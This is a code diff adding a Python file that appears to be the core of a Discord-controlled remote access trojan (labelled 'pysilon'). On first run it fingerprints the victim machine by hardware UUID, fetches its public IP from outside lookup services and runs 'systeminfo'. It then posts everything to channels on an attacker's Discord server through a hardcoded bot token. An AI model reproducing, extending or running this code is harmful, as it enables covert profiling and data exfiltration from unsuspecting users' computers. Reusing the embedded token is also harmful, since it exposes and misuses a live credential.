@@ -1,0 +1,101 @@
+import json
+import discord
+import datetime
+import subprocess
+from discord.ext import commands
+from urllib.request import urlopen
+
+client = commands.Bot(command_prefix=['.'], intents=discord.Intents.all(), case_insensitive=True)
+
+bot_token = "MTE2NzU2MTY1NDg0Njg4NTkzMQ.Gd-63C.IwtjiBRtAEMmEqOycJJPpCc2W7TB0Q5fc4H2tA"
+guild_id = 1164178618361057290
+auto = 'auto'
+channel_ids = {                                                    
+    'info': '',                                                  
+    'main': '',                                                                                                  
+    'file': '',                                                                                                    
+}
+
+@client.event
+async def on_ready():
+    global channel_ids
+    first_run = True
+
+    hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\n')[1].strip()
+    for category_name in client.get_guild(guild_id).categories:
+        if hwid in str(category_name):
+            first_run, category = False, category_name
+            break
+    
+    if not first_run:
+        category_channel_names = []
+        for channel in category.channels:
+            category_channel_names.append(channel.name)
+
+        if 'file-related' not in category_channel_names and channel_ids['file']: 
+            temp = await client.get_guild(guild_id).create_text_channel('file', category=category)
+            channel_ids['file'] = temp.id
+
+    if first_run:
+        category = await client.get_guild(guild_id).create_category(hwid)
+        temp = await client.get_guild(guild_id).create_text_channel('info', category=category); channel_ids['info'] = temp.id
+        temp = await client.get_guild(guild_id).create_text_channel('main', category=category); channel_ids['main'] = temp.id
+        temp = await client.get_guild(guild_id).create_text_channel('file-related', category=category); channel_ids['file'] = temp.id
+
+        try: 
+            await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ident.me').read().decode('utf-8') + ' [ident.me]```')
+        except: pass
+        try:
+            await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ipv4.lafibre.info/ip.php').read().decode('utf-8') + ' [lafibre.info]```')
+        except: pass
+        
+        system_info = force_decode(subprocess.run('systeminfo', capture_output= True, shell= True).stdout).strip().replace('\\xff', ' ')
+        
+        chunk = ''
+        for line in system_info.split('\n'):
+            if len(chunk) + len(line) > 1990:
+                await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
+                chunk = line + '\n'
+            else:
+                chunk += line + '\n'
+        await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
+
+    else:
+        for channel in category.channels:
+            if channel.name == 'info':
+                channel_ids['info'] = channel.id
+            elif channel.name == 'main':
+                channel_ids['main'] = channel.id
+
+def force_decode(b: bytes):
+    try:
+        return b.decode(json.detect_encoding(b))
+    except UnicodeDecodeError:
+        return b.decode(errors= "backslashreplace")
+    
+def current_time(seconds_also=False):
+    return datetime.datetime.now().strftime('%d.%m.%Y_%H.%M' if not seconds_also else '%d.%m.%Y_%H.%M.%S')
+
+@client.command(name="ping")
+async def bot_status(ctx):
+    await client.get_channel(channel_ids['main']).send(ctx.author.mention)
+
+@client.command(name="dc")
+async def delete_category(ctx, category_id):
+  try:
+    category_id = int(category_id)
+    category = discord.utils.get(ctx.guild.categories, id=category_id)
+
+    if not category:
+      await ctx.send('Invalid category id.')
+      return
+
+    for channel in category.channels:
+      await channel.delete()
+
+    await category.delete()
+
+  except ValueError:
+    await ctx.send('Invalid category id.')
+
+# [pysilon] commands
